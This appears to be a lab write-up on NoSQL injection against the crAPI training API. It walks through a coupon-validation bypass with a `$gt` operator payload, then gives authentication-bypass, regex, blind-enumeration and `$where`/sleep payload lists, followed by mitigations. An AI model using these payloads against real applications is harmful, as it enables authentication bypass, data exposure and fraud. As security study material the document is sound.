# NoSQL Injection (API Security)

## Overview

NoSQL Injection is a vulnerability that occurs when user input is not properly validated before being used in NoSQL database queries (such as MongoDB). Attackers can manipulate query logic using special operators to bypass authentication, extract data, or alter application behavior.

---

## Target Endpoints

```
http://192.168.1.28:8888/shop
http://192.168.1.28:8888/community/api/v2/coupon/validate-coupon
```

**Reference payloads:**
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt
```

---

## Example: Coupon Validation Bypass

### Request
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":{"$gt": ""}}
```

### Walkthrough (crAPI Lab)

1. On the crAPI Shop page, entering a random/invalid coupon code (e.g. `qwexdq`) returns **"Invalid Coupon Code"** as expected.
2. Intercepting the request in Burp Repeater and sending the normal string payload `"coupon_code":"qwexdq"` confirms a `500 Internal Server Error` when malformed.
3. Replacing the value with a MongoDB operator injection:
   ```json
   {
       "coupon_code": {
           "$gt": ""
       }
   }
   ```
   causes the `$gt` (greater-than) operator to be evaluated by the backend instead of a literal string comparison — matching **any** coupon code in the database.
4. **Result:** `200 OK` response returning a valid coupon object:
   ```json
   {
       "coupon_code": "TRAC075",
       "amount": "75",
       "CreatedAt": "2026-03-21T12:44:16.914Z"
   }
   ```
5. Submitting the leaked coupon code (`TRAC075`) in the application UI results in **"Coupon applied"**, increasing the account's available balance.

**Issue:** The `validate-coupon` endpoint passes the `coupon_code` field directly into a MongoDB query without validating that it is a plain string, allowing MongoDB query operators (`$gt`, `$ne`, `$regex`, etc.) to be injected.

---

## Vulnerability Description

NoSQL databases like MongoDB accept query objects instead of plain strings. If an API blindly parses JSON input into a query filter, an attacker can replace an expected string value with an operator object (e.g. `{"$gt": ""}`, `{"$ne": null}`) to alter the query's logic — bypassing validation checks that were designed only for exact string matches.

---

## Impact

- Authentication or validation bypass
- Unauthorized access to discounts or features
- Data exposure from database queries
- Business logic abuse

---

## Additional Payload Examples

### Always True Condition
```json
{"coupon_code":{"$ne": null}}
```

### Regex Bypass
```json
{"coupon_code":{"$regex": ".*"}}
```

### Authentication Bypass Example
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

### Blind NoSQL Injection
```json
{"coupon_code":{"$regex":"^A"}}
```
Used to enumerate values character by character.

---

## Detection Techniques

- Send JSON objects instead of expected strings
- Use operators such as:
  - `$ne`
  - `$gt`
  - `$lt`
  - `$regex`
- Observe:
  - Changes in response behavior
  - Successful bypass of validation
  - Unexpected data returned

---

## Mitigation Strategies

### Input Validation
- Enforce strict data types (e.g., string only)
- Reject objects and operators in user input
- Use safe query builders or ORM methods

### Sanitization
- Remove or block special MongoDB operators (`$`, `.`)

### Schema Enforcement
- Apply schema validation (e.g., MongoDB schema validation)

### Least Privilege
- Restrict database permissions to minimize impact

---

## Key Takeaway

NoSQL Injection allows attackers to manipulate database queries by injecting operators into input fields. Proper validation, sanitization, and secure query handling are essential to prevent this class of vulnerabilities.

---

## Reference Payload List (PayloadsAllTheThings — NoSQL.txt)

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a'
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
{"$gt": ""}
[$ne]=1
';sleep(5000);
';sleep(5000);'
';sleep(5000);+'
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true
{"&exists":false}
```

## Potential Next Steps
- Build a full NoSQL Injection lab (Node.js + MongoDB)
- Set up a Burp Suite Intruder attack for automated payload testing
- Create a CTF-style challenge with flags
- Write advanced blind extraction scripts
